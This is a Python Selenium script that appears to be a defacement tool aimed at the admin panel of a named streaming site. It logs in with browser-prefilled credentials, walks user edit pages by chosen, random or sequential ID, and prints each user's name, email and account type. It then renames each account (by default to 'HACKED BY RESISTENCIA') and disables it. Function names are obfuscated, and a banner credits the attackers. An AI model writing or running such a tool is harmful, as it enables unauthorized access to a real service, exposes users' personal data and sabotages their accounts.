import selenium
import random
import os
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

print(">>> Starting Firefox webdriver!")
driver = webdriver.Firefox()

thewebsiteurl_login = "https://webflix.virmana.com/admin/login" #Login Website
thewebsiteurl_edit = "https://webflix.virmana.com/admin/users/edit/" #Edit Website
maxtest = 12930 # Max users
mintest = 99 # Min users
usersedited = ["98"] # list of users that were added when you use All users option
usernameforall = "HACKED BY RESISTENCIA"

os.system("cls")

def banner():
    os.system("cls")
    print(" __          __  ____    ______   _   _          _____                   _     _")     
    print(" \ \        / / |  _ \  |  ____| | | (_)        |  __ \                 | |   | |    ")
    print("  \ \  /\  / /  | |_) | | |__    | |  _  __  __ | |  | |   ___    __ _  | |_  | |__  ")
    print("   \ \/  \/ /   |  _ <  |  __|   | | | | \ \/ / | |  | |  / _ \  / _` | | __| | '_ \ ")
    print("    \  /\  /    | |_) | | |      | | | |  >  <  | |__| | |  __/ | (_| | | |_  | | | |")
    print("     \/  \/     |____/  |_|      |_| |_| /_/\_\ |_____/   \___|  \__,_|  \__| |_| |_|")
    print("                                        RͭSͤTͣRͫ")

def main():
    banner()
    IJIJJJJIIJJJIJJJIJIIIJJJIJJJJJJJJIIJJJIIJJ()

def IJIJJJJIIJJJIJJJIJIIIJJJIJJJJJJJJIIJJJIIJJ():
    print("")
    print("Panel created by Leurak Hacker | Tenebroso")
    print(" [1] Try login as admin")
    op7 = input("\>")
    if op7 == "1":
        JIJJJJIIJJJIJIJJJJIIIIIIJJJJJJIIJJJJIIIJJJ()
    else:
        banner()
        main()
     
def JIJJJJIIJJJIJIJJJJIIIIIIJJJJJJIIJJJJIIIJJJ():
    print(">>> Logging in ADMIN page! " + thewebsiteurl_login)
    driver.get(thewebsiteurl_login) #Open browser
    textbox = driver.find_element(By.NAME,"_username")
    text = textbox.get_attribute("value")
    if text:
        print("> Login username detected as: " + text)
    elif text:
        textbox.send_keys(text)
    textbox2 = driver.find_element(By.NAME,"_password")
    text2 = textbox2.get_attribute("value")
    if text2:
        print("> Login password detected as: " + text2)
    elif text2:
        textbox2.send_keys(text2)
    button = driver.find_element(By.XPATH,"//button[text()='Log in']")
    button.click()
    print(">>> Logged in!")
    JIJJJJIIJJJIJJJJJIIIIIIJJJJJJIIJJJJIIIJJJ()
    #driver.close()

def JIJJJJIIJJJIJJJJJIIIIIIJJJJJJIIJJJJIIIJJJ():
    print(" [1] An user ID\n [2] Random users (Random by sys)\n [3] All users (soon)") # Options for select
    op5 = input("\>")
    if op5 == "1":
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    elif op5 == "2":
        JIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJJIIIJJJ()
    elif op5 == "3":
        JIJJJJJJJJJJJJJJJJJJJIIJJJJJJIIJJJJJJIIIJ()
    else:
       print("Not work")
       JIJJJJIIJJJIJJJJJIIIIIIJJJJJJIIJJJJIIIJJJ()
    
def IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ():
    nmrstrmin = str(mintest)
    nmrstrmax = str(maxtest)
    print(">>> Input a ID (ex: min: " + nmrstrmin + ", max: " + nmrstrmax + ") to edit user:")
    op6 = input("\>")
    if op6 == "":
        print("Cant be empty")
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    elif int(op6) > maxtest:
        num2 = str(mintest)
        num3 = str(maxtest)
        print("Not work, min: " + num2 + ", max: " + num3)
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    elif int(op6) < mintest:
        num2 = str(mintest)
        num3 = str(maxtest)
        print("Not work, min: " + num2 + ", max: " + num3)
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    elif op6:
        driver.get(thewebsiteurl_edit + op6 +".html") # User selected with id that you put
    else:
        print("Not work")
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    print("")
    print("==============================================")
    print(">>> Actually infos: <<<")
    try:
        textAc = driver.find_element(By.NAME,"user[name]")
    except:
        print(">> Page unavaliable! 404")
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
        return
    textAcTe = textAc.get_attribute("value")
    print("> Full name: " + textAcTe)
    textAc2 = driver.find_element(By.NAME,"user[email]")
    textAcTe2 = textAc2.get_attribute("value")
    print("> User Email/AuthID: " + textAcTe2)
    textAc3 = driver.find_element(By.NAME,"user[type]")
    textAcTe3 = textAc3.get_attribute("value")
    print("> Account type: " + textAcTe3)
    print("==============================================")
    print("")
    print(">>> Input a new name to set on user:")
    op3 = input("\>")
    if op3 == "":
        print("Cant be empty")
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    elif op3:
        textbox3 = driver.find_element(By.NAME,"user[name]")
        textbox3.clear()
        textbox3.send_keys(op3)
    checkbox = driver.find_element(By.NAME,"user[enabled]")
    if checkbox.get_attribute("checked") != "false":
       checkbox.click()
    else:
        print("Check not selected")
    button = driver.find_element(By.NAME,"user[save]")
    button.click()
    print(op3 + " setted on user | account disabled by RͭSͤTͣRͫ")
    #driver.close()
    quit()

def JIJJJJJJJJJJJJJJJJJJJIIJJJJJJIIJJJJJJIIIJ():
    print(">>> Input a new name to set on all users:")
    op3 = input("\>")
    if op3 == "":
        print("Cant be empty")
        IJIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJIIIJJJ()
    elif op3:
        JIJJJJIIJJJIJJJIJIIIIIIJJJJJJJIIJIJJIIIJJJ(op3)

def JIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJJIIIJJJ():
    index = random.randint(mintest, maxtest)
    numstr = str(index)
    print(">> Random selected: " + numstr)
    driver.get(thewebsiteurl_edit + numstr + ".html") # Random IDS
    print("")
    print("=================================================")
    print(">>> Actually infos: <<<")
    try:
        textAc = driver.find_element(By.NAME,"user[name]")
    except:
        print(">> Page unavaliable! 404")
        JIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJJIIIJJJ()
        return
    textAcTe = textAc.get_attribute("value")
    print("> Full name: " + textAcTe)
    textAc2 = driver.find_element(By.NAME,"user[email]")
    textAcTe2 = textAc2.get_attribute("value")
    print("> User Email/AuthID: " + textAcTe2)
    textAc3 = driver.find_element(By.NAME,"user[type]")
    textAcTe3 = textAc3.get_attribute("value")
    print("> Account type: " + textAcTe3)
    print("=================================================")
    print("")
    print(">>> Input a name to set on user:")
    op3 = input("\>")
    if op3 == "":
        print("Cant be empty")
        JIJJJJIIJJJIJJJIJIIIIIJJJJJJJIIJJJJIIIJJJ()
    elif op3:
        textbox3 = driver.find_element(By.NAME,"user[name]")
        textbox3.clear()
        textbox3.send_keys(op3)
    checkbox = driver.find_element(By.NAME,"user[enabled]")
    if checkbox.get_attribute("checked") != "false":
       checkbox.click()
    else:
        print("Check not selected")
    button = driver.find_element(By.NAME,"user[save]")
    button.click()
    print("")
    print(op3 + " setted on user | account disabled by RͭSͤTͣRͫ")
    #driver.close()
    #main()
    quit()

def JIJJJJIIJJJIJJJIJIIIIIIJJJJJJJIIJIJJIIIJJJ(stringtest):
    #status_code = driver.execute_script("return arguments[0].status;", driver.find_element(By.TAG_NAME,"html"))
    i = random.randint(mintest, maxtest)
    numstr = str(i)
    if numstr in usersedited:
        print(">> Already on list: " + numstr)
        JIJJJJIIJJJIJJJIJIIIIIIJJJJJJJIIJIJJIIIJJJ(stringtest)
    else:
        usersedited.append(numstr)
    print(">> User selected: " + numstr)
    driver.get(thewebsiteurl_edit + numstr + ".html") # Random IDS
    print("")
    print("==============================================")
    try:
        textAc = driver.find_element(By.NAME,"user[name]")
    except:
       print(">> Page unavaliable! 404")
       JIJJJJIIJJJIJJJIJIIIIIIJJJJJJJIIJIJJIIIJJJ(stringtest)
       return
    textAcTe = textAc.get_attribute("value")
    print(">>> Actually infos: <<<")
    print("> Full name: " + textAcTe)
    textAc2 = driver.find_element(By.NAME,"user[email]")
    textAcTe2 = textAc2.get_attribute("value")
    print("> User Email/AuthID: " + textAcTe2)
    textAc3 = driver.find_element(By.NAME,"user[type]")
    textAcTe3 = textAc3.get_attribute("value")
    print("> Account type: " + textAcTe3)
    print("==============================================")
    print("")
    textbox3 = driver.find_element(By.NAME,"user[name]")
    textbox3.clear()
    textbox3.send_keys(stringtest)
    checkbox = driver.find_element(By.NAME,"user[enabled]")
    if checkbox.get_attribute("checked") != "false":
       checkbox.click()
    else:
        print("Check not selected")
    button = driver.find_element(By.NAME,"user[save]")
    button.click()
    print("")
    print(stringtest + " setted on user | account disabled by RͭSͤTͣRͫ")
   
    #main()
    num4 = str(maxtest)
    count = len(usersedited)
    if count < maxtest - mintest:
        JIJJJJIIJJJIJJJIJIIIIIIJJJJJJJIIJIJJIIIJJJ(stringtest)
    else:
         print(">>> All users have been edited!")
         print(">>> Closing script! bye bye")
         quit()
         #driver.close()

if __name__ == '__main__':
    main()
